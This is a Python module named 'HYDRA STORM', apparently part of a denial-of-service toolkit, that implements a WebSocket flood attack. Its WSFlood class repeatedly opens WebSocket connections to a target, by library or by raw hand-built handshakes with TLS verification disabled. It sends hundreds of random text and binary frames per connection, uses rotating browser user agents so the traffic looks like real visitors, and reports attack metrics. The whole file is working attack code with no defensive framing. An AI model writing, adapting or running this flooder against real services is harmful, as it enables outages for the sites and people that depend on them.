"""
HYDRA STORM v1.0 — WebSocket Flood Vector
Uses 'websockets' if installed, otherwise raw socket WS handshake + framing.
"""

import socket
import ssl
import random
import string
import struct
import hashlib
import base64
import threading
import time
import os
from typing import Any, Optional, List

# ─── Optional websockets library ───
try:
    import websockets             # type: ignore
    import websockets.sync.client  # type: ignore
    WS_LIB_AVAILABLE = True
except ImportError:
    WS_LIB_AVAILABLE = False


_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
]


# ============================================================
#  Raw WebSocket Frame Builder
# ============================================================
def build_ws_frame(payload: bytes, opcode: int = 0x01, masked: bool = True) -> bytes:
    """
    Build a WebSocket frame from scratch.
    opcode: 0x01=text, 0x02=binary, 0x09=ping, 0x0A=pong
    Client frames MUST be masked per RFC 6455.
    """
    frame = bytearray()
    # FIN=1, RSV=0, opcode
    frame.append(0x80 | (opcode & 0x0F))

    length = len(payload)
    mask_bit = 0x80 if masked else 0x00

    if length < 126:
        frame.append(mask_bit | length)
    elif length < 65536:
        frame.append(mask_bit | 126)
        frame.extend(struct.pack("!H", length))
    else:
        frame.append(mask_bit | 127)
        frame.extend(struct.pack("!Q", length))

    if masked:
        mask_key = os.urandom(4)
        frame.extend(mask_key)
        masked_payload = bytearray(length)
        for i in range(length):
            masked_payload[i] = payload[i] ^ mask_key[i % 4]
        frame.extend(masked_payload)
    else:
        frame.extend(payload)

    return bytes(frame)


def _generate_ws_key() -> str:
    """Generate a random Sec-WebSocket-Key for the handshake."""
    return base64.b64encode(os.urandom(16)).decode("ascii")


def _raw_ws_handshake(
    ip: str, port: int, domain: str, use_tls: bool = True, path: str = "/"
) -> socket.socket:
    """
    Perform a raw WebSocket upgrade handshake over TCP/TLS.
    Returns the connected & upgraded socket.
    """
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    raw.settimeout(10)

    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=domain)
    else:
        sock = raw

    sock.connect((ip, port))

    ws_key = _generate_ws_key()
    ua = random.choice(_USER_AGENTS)

    handshake = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"User-Agent: {ua}\r\n"
        f"Origin: https://{domain}\r\n"
        f"\r\n"
    )
    sock.sendall(handshake.encode())

    # Read the upgrade response
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("WS handshake failed — connection closed")
        response += chunk

    if b"101" not in response:
        sock.close()
        raise ConnectionError(f"WS handshake rejected: {response[:100]}")

    return sock


# ============================================================
#  WebSocket Flood
# ============================================================
class WSFlood:
    """
    WebSocket flood attack.
    - With 'websockets' lib: opens proper WS connections and floods frames
    - Without: raw socket handshake + hand-built frames
    Sends a mix of text and binary frames to stress the WS handler.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        ws_path: str = "/",
        use_tls: bool = True,
        messages_per_conn: int = 500,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.ws_path = ws_path
        self.use_tls = use_tls
        self.messages_per_conn = messages_per_conn

        # Pre-generate payloads
        self._text_payloads: List[bytes] = [
            "".join(random.choices(string.ascii_letters + string.digits + " ", k=random.randint(50, 2000)))
            .encode()
            for _ in range(50)
        ]
        self._binary_payloads: List[bytes] = [
            os.urandom(random.randint(64, 4096))
            for _ in range(50)
        ]
        # Pre-build raw frames for the no-lib path
        self._text_frames: List[bytes] = [
            build_ws_frame(p, opcode=0x01) for p in self._text_payloads
        ]
        self._binary_frames: List[bytes] = [
            build_ws_frame(p, opcode=0x02) for p in self._binary_payloads
        ]

    def _fire_with_library(self, stop_event: threading.Event) -> None:
        """Flood using the websockets library."""
        scheme = "wss" if self.use_tls else "ws"
        uri = f"{scheme}://{self.domain}:{self.port}{self.ws_path}"

        while not stop_event.is_set():
            ws = None
            try:
                ws = websockets.sync.client.connect(
                    uri,
                    additional_headers={
                        "User-Agent": random.choice(_USER_AGENTS),
                    },
                    open_timeout=10,
                    close_timeout=2,
                )
                self.metrics.conn()

                for _ in range(self.messages_per_conn):
                    if stop_event.is_set():
                        break

                    if random.random() > 0.3:
                        # Text frame
                        payload = random.choice(self._text_payloads)
                        ws.send(payload.decode("ascii", errors="ignore"))
                        self.metrics.hit(len(payload))
                    else:
                        # Binary frame
                        payload = random.choice(self._binary_payloads)
                        ws.send(payload)
                        self.metrics.hit(len(payload))

            except Exception:
                self.metrics.err()
            finally:
                if ws:
                    try:
                        ws.close()
                    except Exception:
                        pass

    def _fire_raw(self, stop_event: threading.Event) -> None:
        """Flood using raw socket WS handshake + hand-built frames."""
        all_frames = self._text_frames + self._binary_frames

        while not stop_event.is_set():
            sock: Optional[socket.socket] = None
            try:
                sock = _raw_ws_handshake(
                    self.target_ip, self.port, self.domain,
                    use_tls=self.use_tls, path=self.ws_path,
                )
                self.metrics.conn()

                for _ in range(self.messages_per_conn):
                    if stop_event.is_set():
                        break

                    frame = random.choice(all_frames)
                    try:
                        sock.sendall(frame)
                        self.metrics.hit(len(frame))
                    except OSError:
                        break

                    # Occasionally send a ping frame
                    if random.random() < 0.05:
                        ping = build_ws_frame(b"keepalive", opcode=0x09)
                        try:
                            sock.sendall(ping)
                        except OSError:
                            break

                    # Drain incoming (pongs, etc)
                    try:
                        sock.recv(4096)
                    except (socket.timeout, OSError):
                        pass

            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.shutdown(socket.SHUT_RDWR)
                    except OSError:
                        pass
                    try:
                        sock.close()
                    except OSError:
                        pass

    def fire(self, stop_event: threading.Event) -> None:
        if WS_LIB_AVAILABLE:
            self._fire_with_library(stop_event)
        else:
            self._fire_raw(stop_event)
